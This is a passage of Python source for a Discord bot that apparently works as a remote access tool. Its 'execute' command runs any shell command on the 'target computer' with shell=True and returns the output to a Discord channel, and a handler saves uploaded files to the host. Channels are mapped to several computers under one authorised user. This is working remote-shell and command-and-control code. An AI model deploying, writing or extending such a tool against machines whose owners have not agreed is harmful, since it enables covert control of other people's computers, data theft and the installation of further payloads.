        await attachment.save(dest_path)
        
        await ctx.send(f"✅ File uploaded to: {dest_path} ({attachment.size / 1024:.2f} KB)")
        
    except asyncio.TimeoutError:
        await ctx.send("❌ Timed out waiting for file attachment.")
    except Exception as e:
        await ctx.send(f"❌ Error uploading file: {e}")
        logger.error(f"File upload error: {e}")

@bot.command(name="execute")
async def execute_command(ctx, *, command=None):
    """Execute a command on the target computer"""
    # Check if user is authorized
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    
    # Check if this command is for this computer
    if ctx.channel.id in computer_channels:
        target_computer = computer_channels[ctx.channel.id]
        if target_computer != COMPUTER_NAME:
            await ctx.send(f"⚠️ This command was sent to {target_computer}, but this is {COMPUTER_NAME}. Command ignored.")
            return
    
    if not command:
        await ctx.send("❌ Please specify a command to execute.")
        return
    
    try:
        # Create a message to show the command being executed
        await ctx.send(f"🖥️ Executing command: `{command}`")
        
        # Create a subprocess to run the command
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Wait for the process to complete with a timeout
        try:
            stdout, stderr = process.communicate(timeout=30)
        except subprocess.TimeoutExpired:
            process.kill()
            await ctx.send("⏱️ Command execution timed out after 30 seconds.")
            return
        
        # Send the output
        if stdout:
            # Split output if it's too long
            if len(stdout) > 1900:
                parts = []
                while stdout:
                    parts.append(stdout[:1900])
                    stdout = stdout[1900:]
                
                for i, part in enumerate(parts):
                    await ctx.send(f"```\n# Output part {i+1}/{len(parts)}\n{part}```")
            else:
                await ctx.send(f"```\n# Command output\n{stdout}```")
        
        if stderr:
            # Split errors if too long
            if len(stderr) > 1900:
                parts = []
                while stderr:
                    parts.append(stderr[:1900])
                    stderr = stderr[1900:]
                
                for i, part in enumerate(parts):
                    await ctx.send(f"```\n# Error part {i+1}/{len(parts)}\n{part}```")
            else:
                await ctx.send(f"```\n# Command errors\n{stderr}```")
        
        # If no output, send a message
        if not stdout and not stderr:
            await ctx.send("✅ Command executed with no output.")
        
        # Send the exit code
        await ctx.send(f"Exit code: {process.returncode}")
        
    except Exception as e:
        await ctx.send(f"❌ Error executing command: {e}")
        logger.error(f"Command execution error: {e}")

def run_bot():
    """Run the Discord bot"""
    try:
        bot.run(TOKEN)
    except Exception as e:
        logger.error(f"Bot run error: {e}")
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    run_bot()
